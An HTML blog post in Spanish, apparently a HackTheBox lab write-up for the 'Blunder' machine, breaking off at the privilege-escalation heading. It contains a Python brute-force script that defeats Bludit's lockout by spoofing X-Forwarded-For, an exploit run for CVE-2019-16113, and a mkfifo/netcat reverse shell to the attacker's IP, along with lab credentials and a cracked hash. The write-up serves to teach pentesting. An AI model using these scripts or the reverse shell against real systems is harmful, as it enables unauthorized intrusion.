@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/piece.png">
+
+<title>Firtsmiracle Blog de Ciberseguridad</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina Blunder - htb writeup | Firtsmiracle blog de Ciberseguridad</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="Maquina Blunder - htb writeup" />
+<meta name="author" content="Firtsmiracle" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Hoy vamos a resolver la máquina Blunder de la plataforma de hackthebox correspondiente a una maquina linux dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor BLUDIT CMS que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de sudo con la que conseguiremos acceso como el usuario root." />
+<meta property="og:description" content="Hoy vamos a resolver la máquina Blunder de la plataforma de hackthebox correspondiente a una maquina linux dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor BLUDIT CMS que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de sudo con la que conseguiremos acceso como el usuario root." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/htb-writeup-Blunder" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/htb-writeup-Blunder" />
+<meta property="og:site_name" content="Firtsmiracle blog de Ciberseguridad" />
+<meta property="og:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Blunder/banner3.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-06-14T00:00:00+00:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/assets/images/HTB/htb-writeup-Blunder/banner3.png" />
+<meta property="twitter:title" content="Maquina Blunder - htb writeup" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Firtsmiracle"},"dateModified":"2023-06-14T00:00:00+00:00","datePublished":"2023-06-14T00:00:00+00:00","description":"Hoy vamos a resolver la máquina Blunder de la plataforma de hackthebox correspondiente a una maquina linux dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor BLUDIT CMS que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de sudo con la que conseguiremos acceso como el usuario root.","headline":"Maquina Blunder - htb writeup","image":"http://localhost:4000/assets/images/HTB/htb-writeup-Blunder/banner3.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/htb-writeup-Blunder"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/piece.png"},"name":"Firtsmiracle"},"url":"http://localhost:4000/hackthebox/htb-writeup-Blunder"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+<!-- CSS -->
+<link href="/assets/css/prism.css" rel="stylesheet">
+<!-- SCSS can't be processed by browser, so we use .CSS to fix it -->
+<link href="/assets/css/theme.css" rel="stylesheet">
+<link href="/assets/css/modal.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h2>BLog de Ciberseguridad</h2><br><br>
+        <li><a href="/" id="menu-home">Inicio</a></li>
+        <li><a href="/categories#articulos">Artículos</a></li>
+        <li><a href="/categories#hackthebox" id="menu-hackthebox">HackTheBox</a></li>
+        <li><a href="/categories#novedades" id="menu-tryhackme">Novedades</a></li>
+        <li><a href="/tags">Tags</a></li>
+        <li><a href="/about" id="menu-aboutme">Información</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Buscar..."/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/piece.png" alt="Firtsmiracle blog de Ciberseguridad">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <script defer src="/assets/js/lightbox.js"></script>
+
+<div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">Maquina Blunder - htb writeup</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/?s=250&d=mm&r=x" alt="">
+            
+        </div>            
+        <div>
+        Firtmiracle <a targ="_blank" class="text-info"></a> el 
+        <span class="post-date"><time class="post-date" datetime="2023-06-14">14 Jun 2023</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="/assets/images/HTB/htb-writeup-Blunder/banner3.png" alt="Maquina Blunder - htb writeup">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Hoy vamos a resolver la máquina <code>Blunder</code> de la plataforma de <code>hackthebox</code> correspondiente a una maquina <code>linux</code> dificultad facil, la cual explotaremos obteniendo información lekeada y obteniendo credenciales a partir de un ataque de fuerza bruta usando una tecnica de bypass, una vez dispongamos de las credenciales podremos vulnerar el gestor <code>BLUDIT CMS</code> que corre la maquina, donde a traves de RCE ganaremos acceso a la maquina y finalmente para escalar privilegios aprovecharemos de una versión vulnerable de <code>sudo</code> con la que conseguiremos acceso como el usuario <code>root</code>.</p>
+
+<p>Maquina interesante asi que a darle!</p>
+
+<p>Vamos a comenzar creando un directorio con el nombre de la maquina:</p>
+
+<pre><code class="language-bash">❯ mkdir Blunder
+❯ ls
+ Blunder
+</code></pre>
+<p>Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:</p>
+
+<pre><code class="language-bash">❯ which mkt
+mkt () {
+	mkdir {nmap,content,exploits,scripts}
+}
+❯ mkt
+❯ ls
+ content   exploits   nmap   scripts
+</code></pre>
+
+<h2 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h2>
+
+<p>Ahora que tenemos nuestros directorios vamos a comenzar con la fase de Enumeracion, empezamos mandando una traza a la ip de la maquina victima con el comando <code>ping</code>:</p>
+
+<pre><code class="language-bash">❯ ping -c 1 10.10.10.191
+PING 10.10.10.191 (10.10.10.191) 56(84) bytes of data.
+64 bytes from 10.10.10.191: icmp_seq=1 ttl=63 time=265 ms
+
+--- 10.10.10.191 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 265.087/265.087/265.087/0.000 ms
+</code></pre>
+<p>Vemos que la maquina nos responde, con un ttl de <code>63</code>correspondiente a una maquina <code>linux</code>, ahora procederemos a el escaneo de puertos con la ayuda de <code>nmap</code>:</p>
+
+<h3 id="escaneo-de-puertos">Escaneo de Puertos</h3>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="#enumeracion">-p-</a></td>
+      <td style="text-align: left">Escaneamos todos los 65535 puertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">–open</a></td>
+      <td style="text-align: left">Solo los puertos que estén abiertos.</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-v</a></td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando (verbose).</td>
+    </tr>
+    <tr>
+      <td><a href="#enumeracion">-oG</a></td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para que mediante una funcion de <a href="https://s4vitar.github.io/">S4vitar</a> nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre <code>openPorts</code>:</p>
+
+<pre><code class="language-java">❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.191 -oG openPorts
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 18:55 GMT
+Initiating SYN Stealth Scan at 18:55
+Scanning 10.10.10.191 [65535 ports]
+Discovered open port 80/tcp on 10.10.10.191
+Completed SYN Stealth Scan at 18:55, 26.57s elapsed (65535 total ports)
+Nmap scan report for 10.10.10.191
+Host is up, received user-set (0.13s latency).
+Scanned at 2023-06-14 18:55:12 GMT for 26s
+Not shown: 65533 filtered tcp ports (no-response), 1 closed tcp port (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+Nmap done: 1 IP address (1 host up) scanned in 26.70 seconds
+           Raw packets sent: 131086 (5.768MB) | Rcvd: 21 (920B)
+</code></pre>
+
+<p>Solamente vemos que se encuentra abierto el puerto <code>80 http</code>.</p>
+
+<h3 id="escaneo-de-version-y-servicios">Escaneo de Version y Servicios.</h3>
+
+<pre><code class="language-java">❯ nmap -sCV -p80 10.10.10.191 -oN targeted
+Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-14 19:00 GMT
+Nmap scan report for 10.10.10.191
+Host is up (0.13s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+|_http-generator: Blunder
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 16.64 seconds
+</code></pre>
+<p>Visulizamos informacion interesante de los puertos escaneados:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th>Servicio</th>
+      <th>Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td>HTTP</td>
+      <td>Apache httpd 2.4.41</td>
+    </tr>
+  </tbody>
+</table>
+
+<h2 id="explotación">Explotación <a href="#explotación">#</a></h2>
+
+<p>Comenzaremos usando <code>whatweb</code>, para enumerar las tecnologias que emplea el servicio web, desde consola.</p>
+
+<pre><code class="language-bash">❯ whatweb http://10.10.10.191
+http://10.10.10.191 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.191], JQuery, MetaGenerator[Blunder], Script, Title[Blunder | A blunder of interesting facts], X-Powered-By[Bludit]
+</code></pre>
+
+<p>La herramienta nos reporta que se el gestor de contenido del servicio web corresponde a un <code>bludit CMS</code>.</p>
+
+<blockquote>
+  <p>Bludit: Bludit es una aplicación web para construir tu propio sitio web o blog en segundos, es completamente gratis y de código abierto</p>
+</blockquote>
+
+<p>Seguidmente vamos abrir la web en el navegador.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder1.PNG" alt="" /></p>
+
+<p>Observamos que a simple vista la pagina no muestra contenido interesante. Por ello intentaremos enumerar rutas expuestas del servicio con la herramienta <code>wfuzz</code>.</p>
+
+<ul>
+  <li><a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></li>
+</ul>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000000026:   200        105 L    303 W      3280 Ch     "about"                                                                                                               
+000000259:   301        0 L      0 W        0 Ch        "admin"                                                                                                               
+000000124:   200        170 L    918 W      7561 Ch     "0"                                                                                                                   
+000002551:   200        110 L    387 W      3959 Ch     "usb"                                                                                                                 
+000003295:   200        21 L     171 W      1083 Ch     "LICENSE"      
+</code></pre>
+
+<p>Despues de unos instantes <code>wfuzz</code> nos reporta rutas validas, en las cuales podemos ver una de <code>admin</code> y si vamos a esa ruta nos redirige a un panel de inicio de sesión.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder2.PNG" alt="" /></p>
+
+<p>Ahora vamos a tratar de validar si existe una ruta <code>robots.txt</code></p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder3.PNG" alt="" /></p>
+
+<p>Vemos que efectivamente existe, ahora haciendo un poco de guesing quiero pensar que existen otros archivo con la extensión <code>.txt</code> en las rutas, asi que nuevamente con <code>wfuzz</code> vamos a validar si existen.</p>
+
+<pre><code class="language-bash">❯ wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.191/FUZZ.txt
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.191/FUZZ.txt
+Total requests: 220560
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                               
+=====================================================================
+
+000001765:   200        1 L      4 W        22 Ch       "robots"                                                                                                              
+000002495:   200        4 L      23 W       118 Ch      "todo"
+</code></pre>
+
+<p>Podemos ver que ademas del robots.txt, existe un archivo <code>todo.txt</code> y si lo visualizamos en el navegador obtenemos un usuario <code>fergus</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder4.PNG" alt="" /></p>
+
+<p>Ahora volvamos a el panel de logeo y interceptemos la petición que se realiza con la ayuda de <code>burpsuite</code> y el <code>foxyproxy</code>.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder5.PNG" alt="" /></p>
+
+<p>Nos abrimos <code>burpsuite</code> y vemos como se transmite la petición.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder6.PNG" alt="" /></p>
+
+<p>Vemos que se envia una petición <code>POST</code> con algunos parametros, incluidos un <code>Token CSRF</code>.</p>
+
+<p>Ahora ya que disponemos de un usuario valido podriamos tratar de mediante un ataque de fuerza bruta obtener la contrasena, pero para ello necesitamos usar un diccionario de contraseñas.</p>
+
+<p>Anterirmente vimos que la pagina web contenia bastante texto, por que podriamos tratar e hacer un diccionario con las palabras usadas, para ello usaremos la herramienta <code>cewl</code> y al pasarle la ip de la web podemos crearnos un diccionario en base a sus palabras y lo exportaremos en un fichero de nombre <code>dictionary.txt</code>.</p>
+
+<pre><code class="language-bash">❯ cewl -w dictionary.txt http://10.10.10.191
+CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
+❯ ls
+ dictionary.txt
+</code></pre>
+
+<p>AHora que disponemos de un usuario valido <code>fergus</code> y de un diccionario de posibles contraseñas <code>dictionary.txt</code>, podemos crearnos un script en <code>python</code> para automatizar el proceso de fuerza bruta y averiguar la contraseña valida.</p>
+
+<p>Llamaremos a nuestro <code>exploit</code> bludit.py.</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+
+from pwn import *
+import requests, re
+
+
+def def_handler(sig, frame):
+    print("\n[!]Saliendo...!\n")
+    sys.exit(1)
+
+#ctrl_c
+signal.signal(signal.SIGINT, def_handler)
+#variables_globales
+main_url = "http://10.10.10.191/admin/"
+
+
+def makeRequests():
+
+    s = requests.session()
+
+    passwords = open("dictionary.txt", 'r')
+
+    p1 = log.progress("Fuerza Bruta")
+    p1.status("Iniciando proceso de Fuerza Bruta")
+    time.sleep(2)
+
+    counter = 1
+
+    for password in passwords.readlines():
+        
+        password = password.strip('\n')
+       
+        p1.status("Probando con la password [%d/349]: %s" % (counter, password))
+
+        r = s.get(main_url)
+
+        tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]
+
+        post_data = {
+                "tokenCSRF": tokenCSRF,
+                "username": "fergus",
+                "password": password,
+                "save": ''
+        }
+
+
+        r = s.post(main_url, data=post_data)
+        counter += 1
+
+        if "Username or password incorrect" not in r.text:
+            p1.success("La contraseña es %s" % password)
+            sys.exit(0)
+
+if __name__=='__main__':
+
+    makeRequests()
+</code></pre>
+
+<p>Ejecutamos el exploit y despues de unos segundos nos valida que la contraseña es: <code>King</code></p>
+
+<pre><code class="language-bash">❯ python3 prueba.py
+[+] Fuerza Bruta: La contraseña es King
+</code></pre>
+
+<p>Probamos a logearnos en el servicio y vemos que las credenciales son incorrectas, ademas vemos un mensaje que nos dice que nuestra ip fue bloqueada.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder8.PNG" alt="" /></p>
+
+<p>Investigando un poco vemos que existe una forma de bypasear el uso de fuerza bruta en <code>Bludit</code>, atraves de la cabezera <code>X-Forwarded-For</code>.</p>
+
+<ul>
+  <li><a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">https://rastating.github.io/bludit-brute-force-mitigation-bypass/</a></li>
+</ul>
+
+<p>Modificamos nuestro exploit y añadismos la cabezera <code>X-Forwarded-For</code>, con el valor de nuestra variable <code>password</code>, aprovechando que este por cada iteración sera aleatorio,</p>
+
+<pre><code class="language-python">#!/usr/bin/python3
+
+from pwn import *
+import requests, re
+
+
+def def_handler(sig, frame):
+    print("\n[!]Saliendo...!\n")
+    sys.exit(1)
+
+#ctrl_c
+signal.signal(signal.SIGINT, def_handler)
+#variables_globales
+main_url = "http://10.10.10.191/admin/"
+
+
+def makeRequests():
+
+    s = requests.session()
+
+    passwords = open("dictionary.txt", 'r')
+
+    p1 = log.progress("Fuerza Bruta")
+    p1.status("Iniciando proceso de Fuerza Bruta")
+    time.sleep(2)
+
+    counter = 1
+    for password in passwords.readlines():
+        
+        password = password.strip('\n')
+        
+        p1.status("Probando con la paassword [%d / 349] %s" % (counter, password))
+
+        r = s.get(main_url)
+
+        tokenCSRF = re.findall(r'name="tokenCSRF" value="(.*?)"', r.text)[0]
+
+        post_data = {
+                "tokenCSRF": tokenCSRF,
+                "username": "fergus",
+                "password": password,
+                "save": ''
+        }
+
+        myHeaders = {
+            'X-Forwarded-For': password
+        }
+
+        r = s.post(main_url, data=post_data, headers=myHeaders)
+        counter += 1
+
+        if "Username or password incorrect" not in r.text:
+            p1.success("La contraseña es %s" % password)
+            sys.exit(0)
+
+if __name__=='__main__':
+
+    makeRequests()
+</code></pre>
+
+<p>Despues de unos instantes logramos obtener la contraseña del usuario <code>fergus:RolandDeschain</code>.</p>
+
+<pre><code class="language-bash">❯ python3 bludit.py
+[.] Fuerza Bruta: Probando con la password the
+[+] Fuerza Bruta: La contraseña es RolandDeschain
+</code></pre>
+
+<p>Validamos la contraseña en la pagina de logeo y ganamos acceso a un panel de dashboard.</p>
+
+<p><img src="/assets/images/HTB/htb-writeup-Blunder/blunder7.PNG" alt="" /></p>
+
+<p>Si ahora buscamos vulnerabilidades asociadas a <code>bludit</code>, encontramos un exploit en python asociado <code>Directory Traversal</code> que deriva en ejecución remota de comandos.</p>
+
+<pre><code class="language-bash">❯ searchsploit bludit
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                       |  Path
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Bludit - Directory Traversal Image File Upload (Metasploit)                                                                                          | php/remote/47699.rb
+Bludit 3.13.1 - 'username' Cross Site Scripting (XSS)                                                                                                | php/webapps/50529.txt
+Bludit 3.9.12 - Directory Traversal                                                                                                                  | php/webapps/48568.py
+Bludit 3.9.2 - Auth Bruteforce Bypass                                                                                                                | php/webapps/48942.py
+Bludit 3.9.2 - Authentication Bruteforce Bypass (Metasploit)                                                                                         | php/webapps/49037.rb
+Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass                                                                                           | php/webapps/48746.rb
+Bludit 3.9.2 - Directory Traversal                                                                                                                   | multiple/webapps/48701.txt
+bludit Pages Editor 3.0.0 - Arbitrary File Upload                                                                                                    | php/webapps/46060.txt
+----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results
+</code></pre>
+
+<p>Nos traemos el exploit y al ejecutarlo nos pide algunos parametros</p>
+
+<pre><code class="language-bash">❯ searchsploit -m php/webapps/48568.py
+  Exploit: Bludit 3.9.12 - Directory Traversal
+      URL: https://www.exploit-db.com/exploits/48568
+     Path: /usr/share/exploitdb/exploits/php/webapps/48568.py
+File Type: Python script, ASCII text executable, with very long lines
+
+Copied to: /home/fmiracle/Git/firtsmiracle.github.io/assets/images/HTB/htb-writeup-Blunder/48568.py
+❯ mv 48568.py exploit_bludit.py
+❯ python3 exploit_bludit.py
+
+
+╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
+╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
+╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
+
+ CVE-2019-16113 CyberVaca
+
+
+usage: exploit_bludit.py [-h] -u URL -user USER -pass PASSWORD -c COMMAND
+exploit_bludit.py: error: the following arguments are required: -u, -user, -pass, -c
+</code></pre>
+
+<p>Ejecutamos el exploit con los parametros correspondientes y con <code>-c</code> especificamos el comandos que deseamos ejecutar, para ello probaremos enviarnos una traza a nuestra maquina.</p>
+
+<pre><code class="language-bash">❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'ping 10.10.16.4'
+
+
+╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
+╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
+╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
+
+ CVE-2019-16113 CyberVaca
+
+
+[+] csrf_token: 56c6bb6a8ba8cb234b81e3fc60794fa537f591c6
+[+] cookie: tg456638i906rknr4n27it5kr3
+[+] csrf_token: 0208621fe6b05f215d6f16a7675200b78af3cd2b
+[+] Uploading tdbdwfqf.jpg
+[+] Executing command: ping 10.10.16.4
+[+] Delete: .htaccess
+[+] Delete: tdbdwfqf.jpg
+</code></pre>
+
+<p>y vemos que recibimos la traza en nuestro equipo.</p>
+
+<pre><code class="language-bash">❯ tcpdump -i tun0 icmp -n
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+20:48:34.774870 IP 10.10.10.191 &gt; 10.10.16.4: ICMP echo request, id 4083, seq 1, length 64
+20:48:34.774896 IP 10.10.16.4 &gt; 10.10.10.191: ICMP echo reply, id 4083, seq 1, length 64
+20:48:35.702537 IP 10.10.10.191 &gt; 10.10.16.4: ICMP echo request, id 4083, seq 2, length 64
+20:48:35.702583 IP 10.10.16.4 &gt; 10.10.10.191: ICMP echo reply, id 4083, seq 2, length 64
+20:48:36.774871 IP 10.10.10.191 &gt; 10.10.16.4: ICMP echo request, id 4083, seq 3, length 64
+20:48:36.774913 IP 10.10.16.4 &gt; 10.10.10.191: ICMP echo reply, id 4083, seq 3, length 64
+20:48:37.615149 IP 10.10.10.191 &gt; 10.10.16.4: ICMP echo request, id 4083, seq 4, length 64
+20:48:37.615194 IP 10.10.16.4 &gt; 10.10.10.191: ICMP echo reply, id 4083, seq 4, length 64
+</code></pre>
+
+<p>Lo siguiente sera mandaremos una reverse shell con la versión antigua de <code>ntcat</code> haciendo uso de <code>mkfifo</code> a nuestra maquina.</p>
+
+<pre><code class="language-bash">❯ python3 exploit_bludit.py -u http://10.10.10.191 -user fergus -pass RolandDeschain -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.4 443 &gt;/tmp/f'
+
+
+╔╗ ┬  ┬ ┬┌┬┐┬┌┬┐  ╔═╗╦ ╦╔╗╔
+╠╩╗│  │ │ │││ │   ╠═╝║║║║║║
+╚═╝┴─┘└─┘─┴┘┴ ┴   ╩  ╚╩╝╝╚╝
+
+ CVE-2019-16113 CyberVaca
+
+
+[+] csrf_token: cc25e735f2604125be5c2142412dbe2253a33fea
+[+] cookie: a8c95lrdmos65m0545e9fflgh4
+[+] csrf_token: 0f6fc1b9b0455869059adf72375ddcb9cef563bb
+[+] Uploading rubnxlev.jpg
+[+] Executing command: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.4 443 &gt;/tmp/f
+[+] Delete: .htaccess
+[+] Delete: rubnxlev.jpg
+</code></pre>
+
+<p>Y obtenemos acceso como el usuario <code>www-data</code></p>
+
+<pre><code class="language-bash">❯ ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.191.
+Ncat: Connection from 10.10.10.191:47166.
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+</code></pre>
+
+<p>Como de constumbre vamos a otorgarnos una <code>tty full interactive</code>.</p>
+
+<pre><code class="language-bash">$ script /dev/null -c bash
+Script started, file is /dev/null
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ ^Z
+zsh: suspended  ncat -nlvp 443
+❯ stty raw -echo; fg
+[1]  + continued  ncat -nlvp 443
+                                reset xterm
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export TERM=xterm
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ export SHELL=bash
+www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ stty rows 45 columns 184
+</code></pre>
+
+<p>Enumerando el sistema dentro en el directorio <code>bludit-3-10-0a</code>, encontramos el archivo <code>users.php</code> con un password en hash que podemos tratar de crackear.</p>
+
+<pre><code class="language-bash">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php 
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        "twitter": "",
+        "facebook": "",
+        "instagram": "",
+        "codepen": "",
+        "linkedin": "",
+        "github": "",
+        "gitlab": ""}
+}
+</code></pre>
+
+<p>Para ello usaremos nuestro web de confianza y logramos decifrar la contraseña la cual es <code>Password120</code></p>
+
+<ul>
+  <li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
+</ul>
+
+<p>Con la nueva credencial migramos exitosamente como el usuario <code>hugo</code>, nos dirigimos a su directorio personal y visualizamos la primera flag <code>user.txt</code>.</p>
+
+<pre><code class="language-bash">www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo
+Password: 
+hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ whoami
+hugo
+hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd /home/hugo/
+hugo@blunder:~$ ls
+Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
+hugo@blunder:~$ cat user.txt 
+0ad6d2d9c835f7f10ba8518d29dedc4b
+</code></pre>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios <a href="#escalada-de-privilegios">#</a></h2>
+
